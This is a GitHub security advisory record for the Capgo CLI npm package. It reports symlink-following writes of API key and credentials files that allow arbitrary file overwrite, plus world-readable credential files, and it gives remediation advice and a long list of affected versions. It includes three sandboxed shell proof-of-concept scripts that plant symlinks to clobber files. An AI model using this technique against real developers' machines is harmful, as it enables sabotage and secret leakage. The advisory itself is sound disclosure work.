@@ -1,0 +1,1049 @@
+advisory_id: GHSA-8mpm-q7mh-8fvh
+datasource_id: github_osv/GHSA-8mpm-q7mh-8fvh
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-8mpm-q7mh-8fvh/GHSA-8mpm-q7mh-8fvh.json
+aliases: []
+summary: |
+  Capgo CLI: symlink-following local secret writes enable arbitrary file overwrite + world-readable credentials (0600 missing)
+  ### Summary
+  The Capgo CLI writes sensitive local files (.capgo API key file and build credentials JSON) using unsafe file operations that follow symlinks and do not enforce safe permissions. This allows an attacker-controlled repository to cause arbitrary file overwrite on the developer’s machine when the developer runs the CLI inside that repo. Additionally, global build credentials are written with world-readable permissions (664), exposing signing materials on shared systems.
+
+  ### Details
+  Issue 1 - Arbitrary file overwrite via .capgo symlink (login --local)
+
+  - Location: src/login.ts
+  - Behavior: loginInternal(..., { local: true }) performs writeFileSync('.capgo', ...) before validating the API key with verifyUser().
+  - No checks are performed to prevent writing through a symlink.
+  - Result: if .capgo is a symlink to an arbitrary path, the CLI overwrites the symlink target with attacker-controlled content (the provided API key string), even when login fails.
+
+  Issue 2 - Arbitrary file overwrite via .capgo-credentials.json symlink (build credentials save --local)
+
+  - Location: src/build/credentials.ts (local path is join(cwd(), '.capgo-credentials.json'))
+  - Behavior: credentials are written using writeFile() without checking whether the destination is a symlink.
+  - Result: if .capgo-credentials.json is a symlink to an arbitrary path, the CLI overwrites the symlink target with attacker-controlled JSON (including base64-encoded credential material). This occurs even if the user is not logged in / no API key exists.
+
+  Issue 3 - Insecure default permissions for global credentials
+
+  - Location: src/build/credentials.ts (global path $HOME/.capgo-credentials/credentials.json)
+  - Observed permissions after save: -rw-rw-r-- (664)
+  - Impact: credentials file contains sensitive signing material (e.g., Android keystore + Play config; iOS cert/profile/API key in other flows). World/group readability is unsafe on shared hosts and CI runners. Expected minimum: file 0600, directory 0700.
+
+  ### PoC
+  PoC A: .capgo symlink clobber (writes even when API key invalid)
+  ```
+  set -euo pipefail
+  BASE="/tmp/capgo_cli_poc_$(date +%s)"
+  HOME_SANDBOX="$BASE/home"
+  REPO="$BASE/repo"
+  TARGET="$BASE/clobbered.txt"
+
+  mkdir -p "$HOME_SANDBOX" "$REPO"
+  cd "$REPO"
+  git init -q
+
+  ln -s "$TARGET" .capgo
+
+  # This should fail auth, but still overwrites TARGET
+  HOME="$HOME_SANDBOX" npx --yes @capgo/cli@7.82.0 login "INVALID_KEY_SHOULD_FAIL" --local || true
+
+  echo "== TARGET content =="
+  cat "$TARGET"
+  ```
+  _Expected: On invalid key, nothing is written; .capgo should never follow symlinks.
+  Observed: TARGET contains INVALID_KEY_SHOULD_FAIL._
+
+  PoC B: .capgo-credentials.json symlink clobber (no login required)
+  ```
+  set -euo pipefail
+  BASE="/tmp/capgo_creds_symlink_$(date +%s)"
+  HOME_SANDBOX="$BASE/home"
+  REPO="$BASE/repo"
+  TARGET="$BASE/clobbered_creds.txt"
+
+  mkdir -p "$HOME_SANDBOX" "$REPO"
+  cd "$REPO"
+  git init -q
+
+  ln -s "$TARGET" .capgo-credentials.json
+
+  HOME="$HOME_SANDBOX" npx --yes @capgo/cli@7.82.0 build credentials save \
+    --local --platform android --appId com.example.app \
+    --keystore /etc/hosts --keystore-alias x --keystore-key-password x --play-config /etc/hosts || true
+
+  echo "== TARGET exists and contains JSON written via symlink =="
+  ls -la "$TARGET" || true
+  cat "$TARGET" || true
+  ```
+  _Expected: Refuse to write if destination is symlink; ideally require safe location and permissions.
+  Observed: TARGET is created/overwritten with credentials JSON._
+
+  PoC C: global credentials permissions are world-readable
+  ```
+  set -euo pipefail
+  BASE="/tmp/capgo_creds_perm_$(date +%s)"
+  HOME_SANDBOX="$BASE/home"
+  mkdir -p "$HOME_SANDBOX"
+
+  HOME="$HOME_SANDBOX" npx --yes @capgo/cli@7.82.0 build credentials save \
+    --platform android --appId com.example.app \
+    --keystore /etc/hosts --keystore-alias x --keystore-key-password x --play-config /etc/hosts || true
+
+  CREDS="$HOME_SANDBOX/.capgo-credentials/credentials.json"
+  ls -la "$CREDS" || true
+  stat -c '%a %U:%G %n' "$CREDS" || true
+  ```
+  _Observed: credentials.json created with mode 664 (-rw-rw-r--)._
+
+  ### Impact
+
+  - Arbitrary file overwrite (clobber) as the user running the CLI (developer workstation / CI runner).
+  - This can cause:
+
+  >developer environment compromise or sabotage (overwriting config files, scripts, env files)
+  >accidental or malicious leakage/destruction of secrets
+
+  - Local secret exposure: global credentials written as 664 allows other local users to read signing material on shared machines.
+  - A realistic scenario: a developer runs npx @capgo/cli ... --local inside an untrusted repo/template; the repo contains malicious symlinks.
+
+  ### Suggested remediation
+
+  - Do not write .capgo until after API key validation succeeds.
+  - For all secret/config writes:
+
+  >refuse symlink destinations (lstat + isSymbolicLink)
+  >use safe file creation and enforce permissions (0600 for files; 0700 for directories)
+  >write atomically (temp file + rename) after safety checks
+
+  - Avoid blindly appending to .gitignore unless it is a regular file (also check for symlink).
+impacted_packages:
+  - purl: pkg:npm/%40capgo/cli
+    affected_versions: vers:npm/<7.84.6
+    fixed_versions: vers:npm/7.84.6
+    affected_packages:
+      - pkg:npm/%40capgo/cli@0.7.0
+      - pkg:npm/%40capgo/cli@0.7.2
+      - pkg:npm/%40capgo/cli@0.7.3
+      - pkg:npm/%40capgo/cli@0.7.4
+      - pkg:npm/%40capgo/cli@0.8.1
+      - pkg:npm/%40capgo/cli@0.8.2
+      - pkg:npm/%40capgo/cli@0.8.3
+      - pkg:npm/%40capgo/cli@0.8.5
+      - pkg:npm/%40capgo/cli@0.8.6
+      - pkg:npm/%40capgo/cli@0.9.0
+      - pkg:npm/%40capgo/cli@0.10.1
+      - pkg:npm/%40capgo/cli@0.11.0
+      - pkg:npm/%40capgo/cli@0.11.1
+      - pkg:npm/%40capgo/cli@0.11.2
+      - pkg:npm/%40capgo/cli@0.11.3
+      - pkg:npm/%40capgo/cli@0.11.4
+      - pkg:npm/%40capgo/cli@0.11.5
+      - pkg:npm/%40capgo/cli@0.11.6
+      - pkg:npm/%40capgo/cli@0.11.7
+      - pkg:npm/%40capgo/cli@0.12.0
+      - pkg:npm/%40capgo/cli@0.12.1
+      - pkg:npm/%40capgo/cli@0.13.0
+      - pkg:npm/%40capgo/cli@0.13.1
+      - pkg:npm/%40capgo/cli@0.13.2
+      - pkg:npm/%40capgo/cli@0.13.3
+      - pkg:npm/%40capgo/cli@0.13.4
+      - pkg:npm/%40capgo/cli@0.13.5
+      - pkg:npm/%40capgo/cli@0.13.6
+      - pkg:npm/%40capgo/cli@0.13.7
+      - pkg:npm/%40capgo/cli@0.13.8
+      - pkg:npm/%40capgo/cli@0.13.9
+      - pkg:npm/%40capgo/cli@0.13.10
+      - pkg:npm/%40capgo/cli@0.13.11
+      - pkg:npm/%40capgo/cli@0.13.12
+      - pkg:npm/%40capgo/cli@0.13.13
+      - pkg:npm/%40capgo/cli@0.13.14
+      - pkg:npm/%40capgo/cli@0.14.0
+      - pkg:npm/%40capgo/cli@0.15.0
+      - pkg:npm/%40capgo/cli@0.15.1
+      - pkg:npm/%40capgo/cli@0.16.0
+      - pkg:npm/%40capgo/cli@0.16.1
+      - pkg:npm/%40capgo/cli@0.16.2
+      - pkg:npm/%40capgo/cli@0.16.3
+      - pkg:npm/%40capgo/cli@0.16.4
+      - pkg:npm/%40capgo/cli@0.16.5
+      - pkg:npm/%40capgo/cli@1.0.0
+      - pkg:npm/%40capgo/cli@1.0.1
+      - pkg:npm/%40capgo/cli@1.0.2
+      - pkg:npm/%40capgo/cli@1.0.3
+      - pkg:npm/%40capgo/cli@1.1.0
+      - pkg:npm/%40capgo/cli@1.1.1
+      - pkg:npm/%40capgo/cli@1.1.8
+      - pkg:npm/%40capgo/cli@1.1.9
+      - pkg:npm/%40capgo/cli@1.1.10
+      - pkg:npm/%40capgo/cli@1.1.12
+      - pkg:npm/%40capgo/cli@1.1.13
+      - pkg:npm/%40capgo/cli@1.2.0
+      - pkg:npm/%40capgo/cli@1.2.1
+      - pkg:npm/%40capgo/cli@1.2.2
+      - pkg:npm/%40capgo/cli@1.2.3
+      - pkg:npm/%40capgo/cli@1.3.0
+      - pkg:npm/%40capgo/cli@1.3.1
+      - pkg:npm/%40capgo/cli@1.4.0
+      - pkg:npm/%40capgo/cli@1.4.1
+      - pkg:npm/%40capgo/cli@1.4.3
+      - pkg:npm/%40capgo/cli@1.4.4
+      - pkg:npm/%40capgo/cli@1.5.0
+      - pkg:npm/%40capgo/cli@1.5.1
+      - pkg:npm/%40capgo/cli@1.6.0
+      - pkg:npm/%40capgo/cli@1.6.1
+      - pkg:npm/%40capgo/cli@1.6.2
+      - pkg:npm/%40capgo/cli@2.0.0
+      - pkg:npm/%40capgo/cli@2.0.1
+      - pkg:npm/%40capgo/cli@2.1.0
+      - pkg:npm/%40capgo/cli@2.1.1
+      - pkg:npm/%40capgo/cli@2.1.2
+      - pkg:npm/%40capgo/cli@2.1.4
+      - pkg:npm/%40capgo/cli@2.1.5
+      - pkg:npm/%40capgo/cli@2.1.6
+      - pkg:npm/%40capgo/cli@2.1.7
+      - pkg:npm/%40capgo/cli@2.1.8
+      - pkg:npm/%40capgo/cli@2.1.9
+      - pkg:npm/%40capgo/cli@2.1.10
+      - pkg:npm/%40capgo/cli@2.1.11
+      - pkg:npm/%40capgo/cli@2.1.12
+      - pkg:npm/%40capgo/cli@2.2.0
+      - pkg:npm/%40capgo/cli@2.2.1
+      - pkg:npm/%40capgo/cli@2.2.2
+      - pkg:npm/%40capgo/cli@2.2.3
+      - pkg:npm/%40capgo/cli@2.2.4
+      - pkg:npm/%40capgo/cli@2.2.5
+      - pkg:npm/%40capgo/cli@2.2.6
+      - pkg:npm/%40capgo/cli@2.2.7
+      - pkg:npm/%40capgo/cli@2.2.8
+      - pkg:npm/%40capgo/cli@2.2.9
+      - pkg:npm/%40capgo/cli@2.2.10
+      - pkg:npm/%40capgo/cli@2.3.2
+      - pkg:npm/%40capgo/cli@2.3.5
+      - pkg:npm/%40capgo/cli@2.3.6
+      - pkg:npm/%40capgo/cli@2.3.7
+      - pkg:npm/%40capgo/cli@2.3.8
+      - pkg:npm/%40capgo/cli@2.3.9
+      - pkg:npm/%40capgo/cli@2.3.10
+      - pkg:npm/%40capgo/cli@2.3.11
+      - pkg:npm/%40capgo/cli@2.3.12
+      - pkg:npm/%40capgo/cli@2.3.13
+      - pkg:npm/%40capgo/cli@2.3.14
+      - pkg:npm/%40capgo/cli@2.3.15
+      - pkg:npm/%40capgo/cli@2.3.16
+      - pkg:npm/%40capgo/cli@2.3.17
+      - pkg:npm/%40capgo/cli@2.3.18
+      - pkg:npm/%40capgo/cli@2.3.19
+      - pkg:npm/%40capgo/cli@2.3.20
+      - pkg:npm/%40capgo/cli@2.3.21
+      - pkg:npm/%40capgo/cli@2.3.22
+      - pkg:npm/%40capgo/cli@2.3.23
+      - pkg:npm/%40capgo/cli@2.3.24
+      - pkg:npm/%40capgo/cli@2.3.25
+      - pkg:npm/%40capgo/cli@2.3.26
+      - pkg:npm/%40capgo/cli@2.3.27
+      - pkg:npm/%40capgo/cli@2.4.0
+      - pkg:npm/%40capgo/cli@2.4.1
+      - pkg:npm/%40capgo/cli@2.4.2
+      - pkg:npm/%40capgo/cli@2.4.3
+      - pkg:npm/%40capgo/cli@2.4.4
+      - pkg:npm/%40capgo/cli@2.4.5
+      - pkg:npm/%40capgo/cli@2.4.6
+      - pkg:npm/%40capgo/cli@2.4.7
+      - pkg:npm/%40capgo/cli@2.5.0
+      - pkg:npm/%40capgo/cli@2.5.1
+      - pkg:npm/%40capgo/cli@2.5.2
+      - pkg:npm/%40capgo/cli@2.5.3
+      - pkg:npm/%40capgo/cli@2.5.4
+      - pkg:npm/%40capgo/cli@2.5.5
+      - pkg:npm/%40capgo/cli@2.5.6
+      - pkg:npm/%40capgo/cli@2.5.7
+      - pkg:npm/%40capgo/cli@2.5.8
+      - pkg:npm/%40capgo/cli@2.5.9
+      - pkg:npm/%40capgo/cli@2.5.10-alpha.0
+      - pkg:npm/%40capgo/cli@2.5.10
+      - pkg:npm/%40capgo/cli@2.5.11
+      - pkg:npm/%40capgo/cli@2.5.12
+      - pkg:npm/%40capgo/cli@2.6.3
+      - pkg:npm/%40capgo/cli@2.6.4
+      - pkg:npm/%40capgo/cli@2.6.5
+      - pkg:npm/%40capgo/cli@2.7.0
+      - pkg:npm/%40capgo/cli@3.0.0-alpha.0
+      - pkg:npm/%40capgo/cli@3.0.0-alpha.1
+      - pkg:npm/%40capgo/cli@3.0.0
+      - pkg:npm/%40capgo/cli@3.0.1
+      - pkg:npm/%40capgo/cli@3.0.2
+      - pkg:npm/%40capgo/cli@3.0.3
+      - pkg:npm/%40capgo/cli@3.0.4
+      - pkg:npm/%40capgo/cli@3.0.5
+      - pkg:npm/%40capgo/cli@3.0.6
+      - pkg:npm/%40capgo/cli@3.0.7
+      - pkg:npm/%40capgo/cli@3.0.8
+      - pkg:npm/%40capgo/cli@3.0.9
+      - pkg:npm/%40capgo/cli@3.0.10
+      - pkg:npm/%40capgo/cli@3.0.11
+      - pkg:npm/%40capgo/cli@3.0.12
+      - pkg:npm/%40capgo/cli@3.0.13
+      - pkg:npm/%40capgo/cli@3.0.14
+      - pkg:npm/%40capgo/cli@3.1.0
+      - pkg:npm/%40capgo/cli@3.2.0
+      - pkg:npm/%40capgo/cli@3.3.0
+      - pkg:npm/%40capgo/cli@3.4.0
+      - pkg:npm/%40capgo/cli@3.4.1
+      - pkg:npm/%40capgo/cli@3.5.0
+      - pkg:npm/%40capgo/cli@3.5.1
+      - pkg:npm/%40capgo/cli@3.5.2
+      - pkg:npm/%40capgo/cli@3.5.3
+      - pkg:npm/%40capgo/cli@3.5.4
+      - pkg:npm/%40capgo/cli@3.5.5
+      - pkg:npm/%40capgo/cli@3.5.6
+      - pkg:npm/%40capgo/cli@3.6.0
+      - pkg:npm/%40capgo/cli@3.6.1
+      - pkg:npm/%40capgo/cli@3.6.2
+      - pkg:npm/%40capgo/cli@3.6.3
+      - pkg:npm/%40capgo/cli@3.6.4
+      - pkg:npm/%40capgo/cli@3.6.5
+      - pkg:npm/%40capgo/cli@3.6.6
+      - pkg:npm/%40capgo/cli@3.6.7
+      - pkg:npm/%40capgo/cli@3.7.0
+      - pkg:npm/%40capgo/cli@3.7.1
+      - pkg:npm/%40capgo/cli@3.8.0
+      - pkg:npm/%40capgo/cli@3.8.1
+      - pkg:npm/%40capgo/cli@3.8.2
+      - pkg:npm/%40capgo/cli@3.8.3
+      - pkg:npm/%40capgo/cli@3.8.4
+      - pkg:npm/%40capgo/cli@3.8.5
+      - pkg:npm/%40capgo/cli@3.9.0
+      - pkg:npm/%40capgo/cli@3.9.1
+      - pkg:npm/%40capgo/cli@3.9.2
+      - pkg:npm/%40capgo/cli@3.10.0
+      - pkg:npm/%40capgo/cli@3.10.1
+      - pkg:npm/%40capgo/cli@3.10.2
+      - pkg:npm/%40capgo/cli@3.10.3
+      - pkg:npm/%40capgo/cli@3.10.4
+      - pkg:npm/%40capgo/cli@3.10.5
+      - pkg:npm/%40capgo/cli@3.10.6
+      - pkg:npm/%40capgo/cli@3.10.7
+      - pkg:npm/%40capgo/cli@3.10.9
+      - pkg:npm/%40capgo/cli@3.10.10
+      - pkg:npm/%40capgo/cli@3.10.11
+      - pkg:npm/%40capgo/cli@3.10.12
+      - pkg:npm/%40capgo/cli@3.10.13
+      - pkg:npm/%40capgo/cli@3.10.14
+      - pkg:npm/%40capgo/cli@3.10.15
+      - pkg:npm/%40capgo/cli@3.10.16
+      - pkg:npm/%40capgo/cli@3.10.17
+      - pkg:npm/%40capgo/cli@3.10.18
+      - pkg:npm/%40capgo/cli@3.10.19
+      - pkg:npm/%40capgo/cli@3.10.20
+      - pkg:npm/%40capgo/cli@3.10.21
+      - pkg:npm/%40capgo/cli@3.11.0
+      - pkg:npm/%40capgo/cli@3.11.5
+      - pkg:npm/%40capgo/cli@3.11.6
+      - pkg:npm/%40capgo/cli@3.11.7
+      - pkg:npm/%40capgo/cli@3.12.0
+      - pkg:npm/%40capgo/cli@3.12.1
+      - pkg:npm/%40capgo/cli@3.12.2
+      - pkg:npm/%40capgo/cli@3.12.3
+      - pkg:npm/%40capgo/cli@3.12.4
+      - pkg:npm/%40capgo/cli@3.12.5
+      - pkg:npm/%40capgo/cli@3.12.6
+      - pkg:npm/%40capgo/cli@3.12.7
+      - pkg:npm/%40capgo/cli@3.13.2
+      - pkg:npm/%40capgo/cli@3.13.3
+      - pkg:npm/%40capgo/cli@3.13.4
+      - pkg:npm/%40capgo/cli@3.13.5
+      - pkg:npm/%40capgo/cli@3.13.6
+      - pkg:npm/%40capgo/cli@3.13.7
+      - pkg:npm/%40capgo/cli@3.13.8
+      - pkg:npm/%40capgo/cli@3.13.9
+      - pkg:npm/%40capgo/cli@3.13.10
+      - pkg:npm/%40capgo/cli@3.13.11
+      - pkg:npm/%40capgo/cli@3.13.13
+      - pkg:npm/%40capgo/cli@3.13.14
+      - pkg:npm/%40capgo/cli@3.13.15
+      - pkg:npm/%40capgo/cli@3.13.16
+      - pkg:npm/%40capgo/cli@3.13.17
+      - pkg:npm/%40capgo/cli@3.13.18
+      - pkg:npm/%40capgo/cli@3.13.19
+      - pkg:npm/%40capgo/cli@3.13.20
+      - pkg:npm/%40capgo/cli@3.13.21
+      - pkg:npm/%40capgo/cli@3.13.22
+      - pkg:npm/%40capgo/cli@3.13.23
+      - pkg:npm/%40capgo/cli@3.13.24
+      - pkg:npm/%40capgo/cli@3.13.25
+      - pkg:npm/%40capgo/cli@3.13.26
+      - pkg:npm/%40capgo/cli@3.13.27
+      - pkg:npm/%40capgo/cli@3.13.30
+      - pkg:npm/%40capgo/cli@3.13.31
+      - pkg:npm/%40capgo/cli@3.14.0
+      - pkg:npm/%40capgo/cli@3.14.1
+      - pkg:npm/%40capgo/cli@3.14.2
+      - pkg:npm/%40capgo/cli@3.14.3
+      - pkg:npm/%40capgo/cli@3.14.4
+      - pkg:npm/%40capgo/cli@3.14.5
+      - pkg:npm/%40capgo/cli@3.14.6
+      - pkg:npm/%40capgo/cli@3.14.7
+      - pkg:npm/%40capgo/cli@3.14.8
+      - pkg:npm/%40capgo/cli@3.14.9
+      - pkg:npm/%40capgo/cli@3.14.10
+      - pkg:npm/%40capgo/cli@3.14.11
+      - pkg:npm/%40capgo/cli@3.14.12
+      - pkg:npm/%40capgo/cli@3.14.13
+      - pkg:npm/%40capgo/cli@3.14.14
+      - pkg:npm/%40capgo/cli@3.14.15
+      - pkg:npm/%40capgo/cli@3.14.16
+      - pkg:npm/%40capgo/cli@3.14.17
+      - pkg:npm/%40capgo/cli@3.14.18
+      - pkg:npm/%40capgo/cli@3.14.19
+      - pkg:npm/%40capgo/cli@3.14.20
+      - pkg:npm/%40capgo/cli@3.14.21
+      - pkg:npm/%40capgo/cli@3.14.22
+      - pkg:npm/%40capgo/cli@3.14.23
+      - pkg:npm/%40capgo/cli@3.14.25
+      - pkg:npm/%40capgo/cli@3.14.26
+      - pkg:npm/%40capgo/cli@3.14.27
+      - pkg:npm/%40capgo/cli@3.14.28
+      - pkg:npm/%40capgo/cli@3.14.29
+      - pkg:npm/%40capgo/cli@3.14.30
+      - pkg:npm/%40capgo/cli@3.14.31
+      - pkg:npm/%40capgo/cli@3.14.32
+      - pkg:npm/%40capgo/cli@3.14.33
+      - pkg:npm/%40capgo/cli@3.14.34
+      - pkg:npm/%40capgo/cli@3.14.35
+      - pkg:npm/%40capgo/cli@3.14.36
+      - pkg:npm/%40capgo/cli@3.14.37
+      - pkg:npm/%40capgo/cli@3.14.38
+      - pkg:npm/%40capgo/cli@3.14.39
+      - pkg:npm/%40capgo/cli@3.14.40
+      - pkg:npm/%40capgo/cli@3.14.41
+      - pkg:npm/%40capgo/cli@3.14.42
+      - pkg:npm/%40capgo/cli@3.14.44-alpha.1
+      - pkg:npm/%40capgo/cli@3.14.44
+      - pkg:npm/%40capgo/cli@3.14.49
+      - pkg:npm/%40capgo/cli@3.14.50
+      - pkg:npm/%40capgo/cli@3.14.51
+      - pkg:npm/%40capgo/cli@3.14.52
+      - pkg:npm/%40capgo/cli@3.14.53
+      - pkg:npm/%40capgo/cli@3.14.54
+      - pkg:npm/%40capgo/cli@3.14.55
+      - pkg:npm/%40capgo/cli@3.14.57
+      - pkg:npm/%40capgo/cli@3.14.58
+      - pkg:npm/%40capgo/cli@3.14.59
+      - pkg:npm/%40capgo/cli@3.14.60
+      - pkg:npm/%40capgo/cli@3.14.61
+      - pkg:npm/%40capgo/cli@3.14.63
+      - pkg:npm/%40capgo/cli@3.14.65
+      - pkg:npm/%40capgo/cli@3.14.67
+      - pkg:npm/%40capgo/cli@3.14.69
+      - pkg:npm/%40capgo/cli@3.14.70
+      - pkg:npm/%40capgo/cli@3.14.71
+      - pkg:npm/%40capgo/cli@4.0.0
+      - pkg:npm/%40capgo/cli@4.0.1
+      - pkg:npm/%40capgo/cli@4.0.2
+      - pkg:npm/%40capgo/cli@4.0.3
+      - pkg:npm/%40capgo/cli@4.0.6
+      - pkg:npm/%40capgo/cli@4.0.7
+      - pkg:npm/%40capgo/cli@4.0.8
+      - pkg:npm/%40capgo/cli@4.0.9
+      - pkg:npm/%40capgo/cli@4.0.10
+      - pkg:npm/%40capgo/cli@4.0.11
+      - pkg:npm/%40capgo/cli@4.0.12
+      - pkg:npm/%40capgo/cli@4.0.13
+      - pkg:npm/%40capgo/cli@4.0.14
+      - pkg:npm/%40capgo/cli@4.1.0
+      - pkg:npm/%40capgo/cli@4.2.0
+      - pkg:npm/%40capgo/cli@4.2.1
+      - pkg:npm/%40capgo/cli@4.2.2-alpha.0
+      - pkg:npm/%40capgo/cli@4.2.2
+      - pkg:npm/%40capgo/cli@4.2.3
+      - pkg:npm/%40capgo/cli@4.2.4
+      - pkg:npm/%40capgo/cli@4.2.7
+      - pkg:npm/%40capgo/cli@4.2.8
+      - pkg:npm/%40capgo/cli@4.2.11
+      - pkg:npm/%40capgo/cli@4.2.12
+      - pkg:npm/%40capgo/cli@4.3.0
+      - pkg:npm/%40capgo/cli@4.3.2
+      - pkg:npm/%40capgo/cli@4.3.3
+      - pkg:npm/%40capgo/cli@4.3.4
+      - pkg:npm/%40capgo/cli@4.3.5
+      - pkg:npm/%40capgo/cli@4.3.6
+      - pkg:npm/%40capgo/cli@4.4.1
+      - pkg:npm/%40capgo/cli@4.4.2
+      - pkg:npm/%40capgo/cli@4.4.3
+      - pkg:npm/%40capgo/cli@4.4.4
+      - pkg:npm/%40capgo/cli@4.4.5
+      - pkg:npm/%40capgo/cli@4.5.0
+      - pkg:npm/%40capgo/cli@4.6.0
+      - pkg:npm/%40capgo/cli@4.6.1
+      - pkg:npm/%40capgo/cli@4.6.2
+      - pkg:npm/%40capgo/cli@4.6.3
+      - pkg:npm/%40capgo/cli@4.7.0
+      - pkg:npm/%40capgo/cli@4.8.0
+      - pkg:npm/%40capgo/cli@4.8.1
+      - pkg:npm/%40capgo/cli@4.8.2
+      - pkg:npm/%40capgo/cli@4.8.3
+      - pkg:npm/%40capgo/cli@4.9.0
+      - pkg:npm/%40capgo/cli@4.9.1
+      - pkg:npm/%40capgo/cli@4.9.2
+      - pkg:npm/%40capgo/cli@4.9.3
+      - pkg:npm/%40capgo/cli@4.10.0
+      - pkg:npm/%40capgo/cli@4.10.1
+      - pkg:npm/%40capgo/cli@4.10.2
+      - pkg:npm/%40capgo/cli@4.10.3
+      - pkg:npm/%40capgo/cli@4.10.6-beta.1
+      - pkg:npm/%40capgo/cli@4.10.7
+      - pkg:npm/%40capgo/cli@4.10.8
+      - pkg:npm/%40capgo/cli@4.10.10
+      - pkg:npm/%40capgo/cli@4.10.11
+      - pkg:npm/%40capgo/cli@4.10.12
+      - pkg:npm/%40capgo/cli@4.10.13
+      - pkg:npm/%40capgo/cli@4.10.14
+      - pkg:npm/%40capgo/cli@4.10.15
+      - pkg:npm/%40capgo/cli@4.10.16
+      - pkg:npm/%40capgo/cli@4.10.17
+      - pkg:npm/%40capgo/cli@4.10.20
+      - pkg:npm/%40capgo/cli@4.10.21
+      - pkg:npm/%40capgo/cli@4.10.22
+      - pkg:npm/%40capgo/cli@4.10.23
+      - pkg:npm/%40capgo/cli@4.10.24-beta.1
+      - pkg:npm/%40capgo/cli@4.10.24
+      - pkg:npm/%40capgo/cli@4.10.25
+      - pkg:npm/%40capgo/cli@4.10.26
+      - pkg:npm/%40capgo/cli@4.10.27
+      - pkg:npm/%40capgo/cli@4.10.28
+      - pkg:npm/%40capgo/cli@4.10.29
+      - pkg:npm/%40capgo/cli@4.10.30
+      - pkg:npm/%40capgo/cli@4.10.31
+      - pkg:npm/%40capgo/cli@4.10.32
+      - pkg:npm/%40capgo/cli@4.10.33
+      - pkg:npm/%40capgo/cli@4.10.34
+      - pkg:npm/%40capgo/cli@4.10.35
+      - pkg:npm/%40capgo/cli@4.10.36
+      - pkg:npm/%40capgo/cli@4.10.37
+      - pkg:npm/%40capgo/cli@4.10.38
+      - pkg:npm/%40capgo/cli@4.10.39
+      - pkg:npm/%40capgo/cli@4.10.40
+      - pkg:npm/%40capgo/cli@4.10.41
+      - pkg:npm/%40capgo/cli@4.10.42
+      - pkg:npm/%40capgo/cli@4.10.43
+      - pkg:npm/%40capgo/cli@4.10.44
+      - pkg:npm/%40capgo/cli@4.10.45
+      - pkg:npm/%40capgo/cli@4.10.46
+      - pkg:npm/%40capgo/cli@4.10.47
+      - pkg:npm/%40capgo/cli@4.10.48
+      - pkg:npm/%40capgo/cli@4.10.49
+      - pkg:npm/%40capgo/cli@4.10.50
+      - pkg:npm/%40capgo/cli@4.10.51
+      - pkg:npm/%40capgo/cli@4.10.52
+      - pkg:npm/%40capgo/cli@4.10.53
+      - pkg:npm/%40capgo/cli@4.10.65-beta.1
+      - pkg:npm/%40capgo/cli@4.11.0
+      - pkg:npm/%40capgo/cli@4.11.1
+      - pkg:npm/%40capgo/cli@4.11.2
+      - pkg:npm/%40capgo/cli@4.11.3
+      - pkg:npm/%40capgo/cli@4.11.4
+      - pkg:npm/%40capgo/cli@4.11.5
+      - pkg:npm/%40capgo/cli@4.11.6
+      - pkg:npm/%40capgo/cli@4.12.0
+      - pkg:npm/%40capgo/cli@4.12.1
+      - pkg:npm/%40capgo/cli@4.12.2
+      - pkg:npm/%40capgo/cli@4.12.3-beta.0
+      - pkg:npm/%40capgo/cli@4.12.3
+      - pkg:npm/%40capgo/cli@4.12.4
+      - pkg:npm/%40capgo/cli@4.12.5
+      - pkg:npm/%40capgo/cli@4.12.6
+      - pkg:npm/%40capgo/cli@4.12.7
+      - pkg:npm/%40capgo/cli@4.12.8
+      - pkg:npm/%40capgo/cli@4.12.9
+      - pkg:npm/%40capgo/cli@4.12.10
+      - pkg:npm/%40capgo/cli@4.12.11
+      - pkg:npm/%40capgo/cli@4.12.12-beta.0
+      - pkg:npm/%40capgo/cli@4.12.12
+      - pkg:npm/%40capgo/cli@4.12.13
+      - pkg:npm/%40capgo/cli@4.12.14-beta.0
+      - pkg:npm/%40capgo/cli@4.12.14
+      - pkg:npm/%40capgo/cli@4.13.2
+      - pkg:npm/%40capgo/cli@4.13.3
+      - pkg:npm/%40capgo/cli@4.13.4
+      - pkg:npm/%40capgo/cli@4.13.5
+      - pkg:npm/%40capgo/cli@4.13.6
+      - pkg:npm/%40capgo/cli@4.13.7
+      - pkg:npm/%40capgo/cli@4.13.8
+      - pkg:npm/%40capgo/cli@4.13.9
+      - pkg:npm/%40capgo/cli@4.13.10-beta.0
+      - pkg:npm/%40capgo/cli@4.13.10
+      - pkg:npm/%40capgo/cli@4.13.11
+      - pkg:npm/%40capgo/cli@4.13.12
+      - pkg:npm/%40capgo/cli@4.13.13
+      - pkg:npm/%40capgo/cli@4.13.14
+      - pkg:npm/%40capgo/cli@4.13.15
+      - pkg:npm/%40capgo/cli@4.13.16
+      - pkg:npm/%40capgo/cli@4.13.17
+      - pkg:npm/%40capgo/cli@4.13.18
+      - pkg:npm/%40capgo/cli@4.13.19
+      - pkg:npm/%40capgo/cli@4.13.20
+      - pkg:npm/%40capgo/cli@4.13.21-beta.1
+      - pkg:npm/%40capgo/cli@4.13.21-beta.2
+      - pkg:npm/%40capgo/cli@4.13.21
+      - pkg:npm/%40capgo/cli@4.13.22
+      - pkg:npm/%40capgo/cli@4.13.23
+      - pkg:npm/%40capgo/cli@4.13.24
+      - pkg:npm/%40capgo/cli@4.13.25
+      - pkg:npm/%40capgo/cli@4.13.26
+      - pkg:npm/%40capgo/cli@4.13.27
+      - pkg:npm/%40capgo/cli@4.13.29
+      - pkg:npm/%40capgo/cli@4.13.30
+      - pkg:npm/%40capgo/cli@4.13.31
+      - pkg:npm/%40capgo/cli@4.13.32
+      - pkg:npm/%40capgo/cli@4.13.33
+      - pkg:npm/%40capgo/cli@4.13.34
+      - pkg:npm/%40capgo/cli@4.14.0
+      - pkg:npm/%40capgo/cli@4.14.1
+      - pkg:npm/%40capgo/cli@4.14.2
+      - pkg:npm/%40capgo/cli@4.14.3
+      - pkg:npm/%40capgo/cli@4.14.4
+      - pkg:npm/%40capgo/cli@4.14.9
+      - pkg:npm/%40capgo/cli@4.14.10
+      - pkg:npm/%40capgo/cli@4.14.11
+      - pkg:npm/%40capgo/cli@4.14.12
+      - pkg:npm/%40capgo/cli@4.14.13
+      - pkg:npm/%40capgo/cli@4.14.14
+      - pkg:npm/%40capgo/cli@4.14.15
+      - pkg:npm/%40capgo/cli@4.14.16
+      - pkg:npm/%40capgo/cli@4.15.0
+      - pkg:npm/%40capgo/cli@4.15.1
+      - pkg:npm/%40capgo/cli@4.15.2
